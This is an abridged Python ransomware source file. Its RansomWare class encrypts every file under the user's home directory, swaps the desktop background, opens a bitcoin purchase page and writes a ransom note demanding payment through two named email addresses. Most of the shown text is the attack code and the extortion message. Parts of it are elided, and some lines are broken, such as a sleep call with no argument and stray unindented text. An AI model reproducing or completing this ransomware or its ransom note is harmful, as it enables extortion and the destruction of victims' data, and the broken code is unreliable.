...
class RansomWare:
    ...
    def __init__(self):
        ...
        #self.localRoot = r'C:\Users\Owner\Downloads\Python-Ransomware-master\localRoot' # Debugging/Testing
        #Use This self.sysRoot = os.path.expanduser('~')
    ...
    def encrypt_fernet_key(self):
        ...
        # Use This original {self.sysRoot}"/" or Desktop/EMAIL_ME.txt', 'wb') as fa: change this back
        with open(f'{self.sysRoot}/Desktop/EMAIL_ME.txt', 'wb') as fa: 
        #with open(f'{self.localRoot}/Desktop/EMAIL_ME.txt', 'wb') as fa:
    ...
    def crypt_system(self, encrypted=False):
        # change self.sysRoot to self.localRoot for demo
        system = os.walk(self.sysRoot, topdown=True) # may need to change to self.sysRoot
    ...
    def what_is_bitcoin():
        ...
        # Open browser to the coinbase site to  purchase bitcoin
        webbrowser.open(url)

    # change me back
    def change_desktop_background(self):
        
        # path to picture that will replace desktop background
        path = r'C:\Users\Owner\Pictures\Ransomware_Picture.jpeg'
    ...
    def ransom_note(self):
        ...
        with open('RANSOM_NOTE.txt', 'w') as f:
            f.write(f'''
    The drives of your computer have been encrypted with a Military grade encryption algorithm. 
    There is no way to restore your data without a special 
    key. Only we can decrypt your files!
    To purchase your key and restore your data, please follow these three easy steps:
    1. Email the file called EMAIL_ME.txt at {self.sysRoot}/Desktop/EMAIL_ME.txt to marksberg05@gmail.com
    2. You will recieve your personal BTC address for payment.
    Once payment has been completed, send another email to (fredholder58@gmail.com) stating "PAID".
    We will check to see if payment has been paid.
    3. You will receive a text file with your KEY that will unlock all your files. 
    IMPORTANT: To decrypt your files, place Put_Me_On_Your_Desktop.txt file on desktop and wait. Shortly after it will begin 
    to decrypt all files.
    WARNING:
    Do NOT attempt to decrypt your files with any software as it is likely to cause irreversable damage, and 
    will cost you more to unlock your files.
    Do NOT send "PAID" without paying, price WILL double for disobedience.
    If you are unable to pay a possible extension may be granted if you adopt a kitten in need from your local animal hospital.
    Upon decryption of your device all backdoors and security flaws should be addressed or we might just come back and say hi.
    Thank you for your patiance as we try to be as speedy as possible in these trying times.
''')  # end
    ...
    def put_me_on_desktop(self):
        ...
        while True:
            try:
                ...
                #with open(f'{self.localRoot}/Desktop/PUT_ME_ON_DESKTOP.txt', 'r') as f:
                    self.key = f.read()
                    self.crypter = Fernet(self.key)
                ...
                pass
            # put 10 in parameters for testing
            time.sleep() # Debugging/Testing check for file on desktop ever 10 seconds
            print('Checking for PUT_ME_ON_DESKTOP.txt') # Debugging/Testing
            # use below code on real system real system. 10 seconds is for testing
             Sleep ~ 3 mins
             secs = 60
             mins = 3
...
def main():
    # testfile = r'C:\Users\Owner\Downloads\Python-Ransomware-master\localRoot\pic.png'
    rw = RansomWare()
    rw.generate_key()
    rw.crypt_system()
    rw.write_key()
